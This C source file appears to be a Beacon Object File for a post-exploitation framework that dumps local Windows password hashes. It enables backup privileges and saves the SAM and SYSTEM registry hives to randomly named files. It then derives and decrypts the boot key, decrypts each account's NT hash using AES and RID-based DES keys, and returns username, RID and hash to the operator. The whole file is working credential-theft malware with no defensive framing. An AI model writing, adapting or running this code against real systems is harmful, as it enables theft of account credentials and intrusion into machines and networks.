#include <stdio.h>
#include <windows.h>
#include "bofdefs.h"
#include "hive_parser.c"
#include "bofdefs.h"
#include "beacon.h"

const BYTE ODD_PARITY[] = {
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110,
    112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127,
    128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143,
    145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158,
    161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174,
    176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191,
    193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206,
    208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223,
    224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239,
    241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254};

// Decrypt data using DES algorithm
BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL result = FALSE;

    NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status))
        return FALSE;

    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (!BCRYPT_SUCCESS(status)) {
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 8, 0);
    if (!BCRYPT_SUCCESS(status)) {
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    DWORD cbResult = 0;
    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)data, 8, NULL, NULL, 0, output, 8, &cbResult, 0);

    result = BCRYPT_SUCCESS(status);

    bcrypt$BCryptDestroyKey(hKey);
    bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Decrypt data using AES-CBC algorithm

BOOL DecryptAES_CBC( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, const BYTE *encrypted, DWORD encryptedLen, BYTE **decryptedOut, DWORD *decryptedOutLen)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL result = FALSE;

    // Open AES algorithm provider
    NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open AES algorithm provider\n");
        return FALSE;
    }

    // Set chaining mode to CBC
    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to set chaining mode\n");
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Generate symmetric key
    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to generate symmetric key\n");
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Allocate output buffer
    *decryptedOut = (BYTE *)AllocateMemory(encryptedLen);
    if (!*decryptedOut) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to allocate memory for decrypted data\n");
        bcrypt$BCryptDestroyKey(hKey);
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Decrypt
    DWORD decryptedSize = 0;
    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)encrypted, encryptedLen, NULL, (PUCHAR)iv, ivLen, *decryptedOut, encryptedLen, &decryptedSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Decryption failed\n");
        FreeMemory(*decryptedOut);
        *decryptedOut = NULL;
        bcrypt$BCryptDestroyKey(hKey);
        bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    *decryptedOutLen = decryptedSize;
    bcrypt$BCryptDestroyKey(hKey);
    bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

// Enable required privileges
BOOL EnablePrivilege(LPCWSTR privilege)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    if (!Advapi32$OpenProcessToken(Kernel32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!Advapi32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
        Kernel32$CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        Kernel32$CloseHandle(hToken);
        return FALSE;
    }

    Kernel32$CloseHandle(hToken);
    return TRUE;
}

// Get current control set from SYSTEM hive
DWORD GetCurrentControlSet(HKEY hSystem)
{
    HKEY hSelect;
    DWORD controlSet = 1;
    DWORD type, value, size = sizeof(DWORD);

    if (Advapi32$RegOpenKeyExA(hSystem, "Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS) {
        if (Advapi32$RegQueryValueExA(hSelect, "Current", NULL, &type, (LPBYTE)&value, &size) == ERROR_SUCCESS)
            controlSet = value;
        Advapi32$RegCloseKey(hSelect);
    }
    return controlSet;
}

// Helper function to get boot key
BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
{
    HKEY hLsa;
    BYTE data[80];
    DWORD size = sizeof(data);
    LONG res;

    if (Advapi32$RegOpenKeyExA(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
        return FALSE;
    }

    const DWORD indices[16] = {0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7};
    const wchar_t *values[] = {L"JD", L"Skew1", L"GBG", L"Data"};

    BYTE bootKeyParts[16];

    for (DWORD i = 0; i < 4; i++)
    {
        // DWORD type, size = 4;
        HKEY hKey;
        wchar_t classValue[256];
        DWORD classValueSize = sizeof(classValue) / 2;

        res = Advapi32$RegOpenKeyW(hLsa, values[i], &hKey);
        if (res != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
            return FALSE;
        }
        if (Advapi32$RegQueryInfoKeyW(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read class");
            return FALSE;
        }
        Advapi32$RegCloseKey(hKey);

        // Decode the bootkey hex strings
        for (size_t j = 0; j < classValueSize / 2; ++j) {
            MSVCRT$swscanf_s(classValue + j * 2, L"%2hhx", bootKeyParts + i * 4 + j);
        }
    }

    // Permute boot key
    for (DWORD i = 0; i < 16; i++)
        bootKey[i] = bootKeyParts[indices[i]];

    Advapi32$RegCloseKey(hLsa);
    return TRUE;
}

// Global pointers for backup paths
char* systemBackupPath __attribute__((section (".data"))) = 0;
char* samBackupPath __attribute__((section (".data"))) = 0;

// Generate random alphanumeric string
void GenerateRandomString(char *buffer, size_t length)
{
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length; ++i) {
        buffer[i] = charset[MSVCRT$rand() % (sizeof(charset) - 1)];
    }
    buffer[length] = '\0';
}

// Initialize backup paths with random directories in AppData\Local
void InitializeBackupPaths()
{
    MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed RNG

    char basePath[MAX_PATH];
    // Get AppData\Local path
    DWORD envLen = Kernel32$GetEnvironmentVariableA("LOCALAPPDATA", basePath, MAX_PATH);
    if (envLen == 0 || envLen >= MAX_PATH)
        MSVCRT$strcpy_s(basePath, MAX_PATH, "C:\\temp"); // Fallback

    char randPart1[9], randPart2[9];
    GenerateRandomString(randPart1, 8); // 8-character random string
    GenerateRandomString(randPart2, 8); // 8-character random string

    // Allocate and build paths
    systemBackupPath = (char *)AllocateMemory(MAX_PATH);
    samBackupPath = (char *)AllocateMemory(MAX_PATH);
    MSVCRT$sprintf_s(systemBackupPath, MAX_PATH, "%s\\%s", basePath, randPart1);
    MSVCRT$sprintf_s(samBackupPath, MAX_PATH, "%s\\%s", basePath, randPart2);
}

// Remember to free memory during cleanup
void CleanupBackupPaths()
{
    FreeMemory(systemBackupPath);
    FreeMemory(samBackupPath);
}

void go()
{

    InitializeBackupPaths();
    LONG res;
    const char *tempSystemKey = "BACKUP1";

    if (!EnablePrivilege(SE_BACKUP_NAME)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable backup privileges. Are you local admin?");
        return;
    }

    if (!EnablePrivilege(SE_RESTORE_NAME)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable restore privileges. Are you local admin?");
        return;
    }

    // Backup hives
    HKEY hSystem;
    HKEY hSam;
    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, KEY_READ, &hSystem);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
        return;
    }

    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hSam);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
        return;
    }

    // Save the hives to a files
    res = Advapi32$RegSaveKeyA(hSystem, systemBackupPath, NULL);
    Advapi32$RegCloseKey(hSystem);
    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
        return;
    }

    res = Advapi32$RegSaveKeyA(hSam, samBackupPath, NULL);
    Advapi32$RegCloseKey(hSam);
    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Dumped SAM and SYSTEM");

    // Load backuped SYSTEM key
    res = Advapi32$RegLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey, systemBackupPath);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegLoadKeyA failed: %d\n", res);
        return;
    }

    // Get current control set
    HKEY hSystemBak;
    res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "BACKUP1", 0, KEY_READ, &hSystemBak);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SYSTEM backup key: %d\n", res);
        return;
    }

    DWORD controlSet = GetCurrentControlSet(hSystemBak);
    BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Found current control set: %d\n", controlSet);
    CHAR lsaPath[MAX_PATH];
    MSVCRT$_snprintf(lsaPath, MAX_PATH, "ControlSet%03d\\Control\\Lsa", controlSet);

    // Extract boot key
    BYTE bootKey[16];
    if (!GetBootKey(hSystemBak, lsaPath, bootKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to extract boot key");
        Advapi32$RegCloseKey(hSystemBak);
        return;
    }
    Advapi32$RegCloseKey(hSystemBak);

    BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Bootkey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                 bootKey[0], bootKey[1], bootKey[2], bootKey[3],
                 bootKey[4], bootKey[5], bootKey[6], bootKey[7],
                 bootKey[8], bootKey[9], bootKey[10], bootKey[11],
                 bootKey[12], bootKey[13], bootKey[14], bootKey[15]);

    res = Advapi32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to unload SYSTEM backup key: %d\n", res);
        return;
    }

    // Open SAM file - needed to decrypt BootKey
    FILE *file = MSVCRT$fopen(samBackupPath, "rb");
    if (!file)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SAM file");
        return;
    }

    struct BaseBlock base;
    if (MSVCRT$fread(&base, 1, sizeof(base), file) != sizeof(base))
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read base block");
        MSVCRT$fclose(file);
        return;
    }

    if (MSVCRT$memcmp(base.signature, "regf", 4) != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Invalid registry file");
        MSVCRT$fclose(file);
        return;
    }

    // Read root key
    uint32_t cellSize;
    BYTE *rootCell = readCell(file, base.rootKeyOffset, &cellSize);
    if (!rootCell)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read root cell");
        MSVCRT$fclose(file);
        return;
    }

    struct NkKey currentKey = parseNkKey(rootCell, cellSize);
    FreeMemory(rootCell);

    if (!currentKey.name)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Root key parse error");
        MSVCRT$fclose(file);
        return;
    }

    // Decrypt boot key

    // Navigate to SAM\Domains\Account
    const char *accountKeyPath[] = {"SAM", "Domains", "Account"};
    struct NkKey accountKey = navigateToPath(file, &currentKey, accountKeyPath, 3);
    freeNkKey(&currentKey);

    if (!accountKey.name)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to navigate to account key");
        MSVCRT$fclose(file);
        return;
    }

    // Read F value
    uint32_t valueCount;
    struct ValueEntry *values = parseValueList(file, accountKey.valueListOffset, accountKey.numValues, &valueCount);
    if (!values)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to parse value list");
        freeNkKey(&accountKey);
        MSVCRT$fclose(file);
        return;
    }

    BYTE *fdata = NULL;
    uint32_t fdataSize = 0;
    for (uint32_t i = 0; i < valueCount; i++)
    {
        if (MSVCRT$strcmp(values[i].name, "F") == 0)
        {
            fdata = readHiveData(file, values[i].dataOffset, values[i].dataSize, &fdataSize);
            break;
        }
    }

    freeValueEntry(values);
    freeNkKey(&accountKey);

    if (!fdata)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read F");
        MSVCRT$fclose(file);
        return;
    }

    // Extract keys1
    if (fdataSize < 0xa8 + 4)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] F too small");
        FreeMemory(fdata);
        MSVCRT$fclose(file);
        return;
    }

    BYTE *keys1 = fdata + 0x68 + 4;
    if (keys1[0] != 0x02)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] This version of Windows is currently unsupported");
        FreeMemory(fdata);
        MSVCRT$fclose(file);
        return;
    }

    // Extract AES data
    BYTE *aes_iv = keys1 + 0x10;
    BYTE *aes_data = keys1 + 0x20;

    // Decrypt the boot key
    BYTE *decryptedBootKey = NULL;
    DWORD decryptedBootKeyLen = 0;
    if (!DecryptAES_CBC(bootKey, 16, aes_iv, 16, aes_data, 16, &decryptedBootKey, &decryptedBootKeyLen))
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to decrypt Bootkey");
        FreeMemory(fdata);
        MSVCRT$fclose(file);
        return;
    }

    FreeMemory(fdata);

    BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Decrypted bootkey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                 decryptedBootKey[0], decryptedBootKey[1], decryptedBootKey[2], decryptedBootKey[3],
                 decryptedBootKey[4], decryptedBootKey[5], decryptedBootKey[6], decryptedBootKey[7],
                 decryptedBootKey[8], decryptedBootKey[9], decryptedBootKey[10], decryptedBootKey[11],
                 decryptedBootKey[12], decryptedBootKey[13], decryptedBootKey[14], decryptedBootKey[15]);

    // Navigate to SAM\Domains\Account\Users
    const char *usersKeyPath[] = {"SAM", "Domains", "Account", "Users"};
    struct NkKey usersKey = navigateToPath(file, &currentKey, usersKeyPath, 4);

    uint32_t offsetCount;
    uint32_t *userOffsets = getSubkeyOffsets(file, usersKey.subkeyListOffset, &offsetCount);
    if (!userOffsets)
    {
        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to get user offsets\n");
        FreeMemory(decryptedBootKey);
        freeNkKey(&usersKey);
        MSVCRT$fclose(file);
        return;
    }

    wchar_t *outputBuffer = (wchar_t *)AllocateMemory((offsetCount * 128) * sizeof(wchar_t)); // Size is only approximate, maybe fix it. However, 128 is big enough
    MSVCRT$memset(outputBuffer, 0,(offsetCount * 128) * sizeof(wchar_t));
    int bufferSize = 0;

    for (uint32_t i = 0; i < offsetCount; i++)
    {
        uint32_t cellSize;
        BYTE *cellData = readCell(file, userOffsets[i], &cellSize);
        if (!cellData)
            continue;

        struct NkKey userKey = parseNkKey(cellData, cellSize);
        FreeMemory(cellData);

        if (!userKey.name || MSVCRT$strcmp(userKey.name, "Names") == 0)
        {
            freeNkKey(&userKey);
            continue;
        }

        uint32_t rid = MSVCRT$strtoul(userKey.name, NULL, 16);

        struct ValueEntry *values = parseValueList(file, userKey.valueListOffset, userKey.numValues, &valueCount);
        if (!values)
        {
            freeNkKey(&userKey);
            continue;
        }

        // Extract F and V
        BYTE *vdata = NULL;
        uint32_t vdataSize = 0;
        BYTE *fdata = NULL;
        uint32_t fdataSize = 0;

        for (uint32_t j = 0; j < valueCount; j++)
        {
            if (MSVCRT$strcmp(values[j].name, "V") == 0)
                vdata = readHiveData(file, values[j].dataOffset, values[j].dataSize, &vdataSize);
            else if (MSVCRT$strcmp(values[j].name, "F") == 0)
                fdata = readHiveData(file, values[j].dataOffset, values[j].dataSize, &fdataSize);
        }

        freeValueEntry(values);
        freeNkKey(&userKey);

        if (!vdata || !fdata) {
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        // Read username
        if (vdataSize <= 0xc + 4 + 4) {
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        uint32_t usernameOffset = *(const int32_t *)(vdata + 0xc + 4) + 0xcc;
        uint32_t usernameLength = *(const int32_t *)(vdata + 0xc + 4 + 4);

        if (vdataSize <= usernameOffset + 4 + usernameLength)
        {
            BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Username offset is more than data size %u\n", usernameOffset);
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        // TODO !!! Crashes on cyrillic usernames + Client is not rendering WCHARS correctly - check and fix
        wchar_t *username = (wchar_t *)AllocateMemory(usernameLength + sizeof(wchar_t)); // wchar because cyrillic and other usernames
        if (!username)
        {
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        MSVCRT$memcpy(username, vdata + usernameOffset + 4, usernameLength);
        username[usernameLength / sizeof(wchar_t)] = L'\0';

        // Read hash
        if (vdataSize <= 0xa8 + 4 + 4)
        {
            FreeMemory(username);
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        uint32_t ntOffset = *(const int32_t *)(vdata + 0xa8 + 4) + 0xcc;
        uint32_t hashLength = *(const int32_t *)(vdata + 0xa8 + 4 + 4);

        if (vdataSize <= ntOffset + 4 + hashLength)
        {
            FreeMemory(username);
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }
        if (hashLength <= 0x18)
        {
            // Empty hash - TODO lookup how secretsdump handles this guys
            wchar_t *partBuffer = (wchar_t *)AllocateMemory(12 * sizeof(wchar_t));
            if (partBuffer == NULL)
            {
                BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Could not allocate buffer");
                FreeMemory(username);
                FreeMemory(vdata);
                FreeMemory(fdata);
                continue;
            }
            MSVCRT$memset(partBuffer, 0, 128 * sizeof(wchar_t));

            int partSize = MSVCRT$sprintf(partBuffer, "%ls:%d:<empty>\n", username, rid);

            MSVCRT$wcscat_s(outputBuffer, offsetCount * 128, partBuffer);
            bufferSize += partSize;

            FreeMemory(username);
            FreeMemory(vdata);
            FreeMemory(fdata);
            continue;
        }

        BYTE *hash_data = vdata + ntOffset + 4;
        BOOL isAes = hash_data[2] == 2;

        if (isAes)
        {
            // Extract salt (IV)
            BYTE *aes_iv = hash_data + 0x8;
            BYTE *aes_data = hash_data + 0x18;

            // Decrypt with AES
            BYTE *encrypted_hash = NULL;
            DWORD encrypted_hash_len = 0;
            if (DecryptAES_CBC(decryptedBootKey, 16, aes_iv, 16, aes_data, 16, &encrypted_hash, &encrypted_hash_len))
            {
                // RID to key(s)
                BYTE s1[7];
                BYTE s2[7];

                s1[0] = rid & 0xff;
                s1[1] = (rid >> 8) & 0xff;
                s1[2] = (rid >> 16) & 0xff;
                s1[3] = (rid >> 24) & 0xff;
                s1[4] = s1[0];
                s1[5] = s1[1];
                s1[6] = s1[2];

                s2[0] = s1[3];
                s2[1] = s1[0];
                s2[2] = s1[1];
                s2[3] = s1[2];
                s2[4] = s2[0];
                s2[5] = s2[1];
                s2[6] = s2[2];

                BYTE k1[8];
                BYTE k2[8];

                k1[0] = ODD_PARITY[(s1[0] >> 1) << 1];
                k1[1] = ODD_PARITY[(((s1[0] & 0x01) << 6) | (s1[1] >> 2)) << 1];
                k1[2] = ODD_PARITY[(((s1[1] & 0x03) << 5) | (s1[2] >> 3)) << 1];
                k1[3] = ODD_PARITY[(((s1[2] & 0x07) << 4) | (s1[3] >> 4)) << 1];
                k1[4] = ODD_PARITY[(((s1[3] & 0x0F) << 3) | (s1[4] >> 5)) << 1];
                k1[5] = ODD_PARITY[(((s1[4] & 0x1F) << 2) | (s1[5] >> 6)) << 1];
                k1[6] = ODD_PARITY[(((s1[5] & 0x3F) << 1) | (s1[6] >> 7)) << 1];
                k1[7] = ODD_PARITY[(s1[6] & 0x7F) << 1];

                k2[0] = ODD_PARITY[(s2[0] >> 1) << 1];
                k2[1] = ODD_PARITY[(((s2[0] & 0x01) << 6) | (s2[1] >> 2)) << 1];
                k2[2] = ODD_PARITY[(((s2[1] & 0x03) << 5) | (s2[2] >> 3)) << 1];
                k2[3] = ODD_PARITY[(((s2[2] & 0x07) << 4) | (s2[3] >> 4)) << 1];
                k2[4] = ODD_PARITY[(((s2[3] & 0x0F) << 3) | (s2[4] >> 5)) << 1];
                k2[5] = ODD_PARITY[(((s2[4] & 0x1F) << 2) | (s2[5] >> 6)) << 1];
                k2[6] = ODD_PARITY[(((s2[5] & 0x3F) << 1) | (s2[6] >> 7)) << 1];
                k2[7] = ODD_PARITY[(s2[6] & 0x7F) << 1];

                // Decrypt with DES now
                BYTE decrypted_hash[16];

                DecryptDES(k1, encrypted_hash, decrypted_hash);
                DecryptDES(k2, encrypted_hash + 8, decrypted_hash + 0x8);

                wchar_t *partBuffer = (wchar_t *)AllocateMemory(128 * sizeof(wchar_t));
                if (partBuffer == NULL)
                {
                    BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Could not allocate buffer");
                    FreeMemory(encrypted_hash);
                    continue;
                }
                MSVCRT$memset(partBuffer, 0, 128 * sizeof(wchar_t));

                int partSize = MSVCRT$sprintf(partBuffer, "%ls:%d:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n", username, rid,
                                              decrypted_hash[0], decrypted_hash[1], decrypted_hash[2], decrypted_hash[3],
                                              decrypted_hash[4], decrypted_hash[5], decrypted_hash[6], decrypted_hash[7],
                                              decrypted_hash[8], decrypted_hash[9], decrypted_hash[10], decrypted_hash[11],
                                              decrypted_hash[12], decrypted_hash[13], decrypted_hash[14], decrypted_hash[15]);

                if (partSize != -1) {
                    BeaconOutput(CALLBACK_OUTPUT, partBuffer, partSize);
                    FreeMemory(partBuffer);
               }

                FreeMemory(encrypted_hash);
            }
        }

        FreeMemory(username);
        FreeMemory(vdata);
        FreeMemory(fdata);
    }


    MSVCRT$fclose(file);
    CleanupBackupPaths();
}
